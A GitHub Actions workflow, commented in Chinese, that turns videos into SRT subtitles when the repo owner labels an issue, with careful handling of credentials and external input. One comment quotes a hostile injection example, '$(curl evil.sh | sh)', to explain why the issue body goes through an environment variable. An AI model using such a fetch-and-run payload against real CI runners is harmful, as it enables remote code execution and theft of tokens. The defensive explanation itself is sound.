name: srt

# 觸發是「加 label」而不是「開 issue」：公開 repo 中只有具 write 權限的人
# 能加 label，所以 GitHub 的權限模型已經擋掉主要攻擊路徑。
on:
  issues:
    types: [labeled]

# 每次執行自動簽發、結束即失效、範圍限定本 repo。不需要 fine-grained PAT。
permissions:
  issues: write
  contents: read

# 同一個 issue 不並行。注意：這擋不住「兩個不同 issue 指向同一支影片」，
# 因為 file id 要進 job 才解析得到。那個殘留競爭條件是刻意接受的風險，
# 改以 preflight 的偏執檢測應對（設計文件 §12）。
concurrency:
  group: srt-${{ github.event.issue.number }}
  cancel-in-progress: false

jobs:
  transcribe:
    # 兩道閘門：label 名稱，以及「加 label 的人」必須是 repo 擁有者。
    # 檢查的是 sender 而不是 issue 作者——外人開的 issue 由擁有者加 label
    # 才會跑，但 issue 內文仍是外部輸入，見下方 ISSUE_BODY 的處理。
    if: >-
      (github.event.label.name == 'srt' || github.event.label.name == 'srt-dryrun')
      && github.event.sender.login == github.repository_owner
    runs-on: ubuntu-latest
    timeout-minutes: 120

    steps:
      - uses: actions/checkout@v4

      - name: 安裝 uv 與釘選的 Python
        uses: astral-sh/setup-uv@v5
        with:
          enable-cache: true

      - name: 安裝依賴
        run: uv sync --frozen

      - name: 還原憑證
        env:
          GCP_ADC_JSON: ${{ secrets.GCP_ADC_JSON }}
          GOOGLE_OAUTH_TOKEN: ${{ secrets.GOOGLE_OAUTH_TOKEN }}
        run: |
          mkdir -p "$HOME/.config/gcloud" "$HOME/.config/polish-screen-record"
          printf '%s' "$GCP_ADC_JSON" > "$HOME/.config/gcloud/application_default_credentials.json"
          printf '%s' "$GOOGLE_OAUTH_TOKEN" > "$HOME/.config/polish-screen-record/token.json"
          chmod 600 "$HOME/.config/gcloud/application_default_credentials.json" \
                    "$HOME/.config/polish-screen-record/token.json"
          echo "GOOGLE_APPLICATION_CREDENTIALS=$HOME/.config/gcloud/application_default_credentials.json" >> "$GITHUB_ENV"

      - name: 安裝 ffmpeg
        # 只有 Groq fallback 路徑需要——Colab VM 本身已預裝 ffmpeg。
        # 這裡用 apt 而非設計文件 §5 要求的 sha256 釘選靜態 build：目前的
        # asr stage key 是以 Drive 的 md5Checksum 為輸入，不含音訊位元組，
        # 所以 ffmpeg 版本不影響快取判斷。若日後把音訊雜湊納入 key，這裡
        # 就必須改成釘選版本。
        run: sudo apt-get update -qq && sudo apt-get install -y -qq ffmpeg

      - name: 安裝 Colab CLI
        # 上游宣告的是未鎖版本的 jupyter-kernel-client，而該套件 1.0.0 把
        # KernelClient 改名，導致 CLI 一執行就 AttributeError。必須釘 0.15.0。
        run: uv tool install --python 3.12 google-colab-cli --with "jupyter-kernel-client==0.15.0"

      - name: 執行 pipeline
        env:
          # issue 內文是外部輸入，絕不可內插進 run: 區塊——外人可以開一個
          # issue 放 $(curl evil.sh | sh)，等被加 label 就在持有 Drive token
          # 的 runner 上執行。走環境變數，由 Python 以嚴格 regex 解析。
          ISSUE_BODY: ${{ github.event.issue.body }}
          ISSUE_NUMBER: ${{ github.event.issue.number }}
          DRY_RUN: ${{ github.event.label.name == 'srt-dryrun' }}
          DEEPSEEK_API_KEY: ${{ secrets.DEEPSEEK_API_KEY }}
          GROQ_API_KEY: ${{ secrets.GROQ_API_KEY }}
        run: uv run psr run --report report.md

      - name: 回報結果
        if: always()
        env:
          GH_TOKEN: ${{ github.token }}
          ISSUE_NUMBER: ${{ github.event.issue.number }}
        run: |
          if [ ! -f report.md ]; then
            printf '執行失敗，且未產生報告。詳見 [執行紀錄](%s/%s/actions/runs/%s)。\n' \
              "$GITHUB_SERVER_URL" "$GITHUB_REPOSITORY" "$GITHUB_RUN_ID" > report.md
          fi
          gh issue comment "$ISSUE_NUMBER" --body-file report.md
